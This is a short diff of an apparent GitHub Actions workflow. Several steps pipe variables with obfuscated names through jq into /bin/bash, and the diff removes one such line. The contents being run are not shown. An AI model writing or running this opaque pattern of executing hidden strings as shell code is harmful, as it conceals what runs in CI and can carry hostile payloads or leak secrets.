@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$cldgp2" | jq -r .dxd8 | /bin/bash
           printf '%s' "$tzzup70" | jq -r .se6 | /bin/bash
           printf '%s' "$dc4" | jq -r .vhq7054 | /bin/bash
-          echo $t8540 | jq -r .n36 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
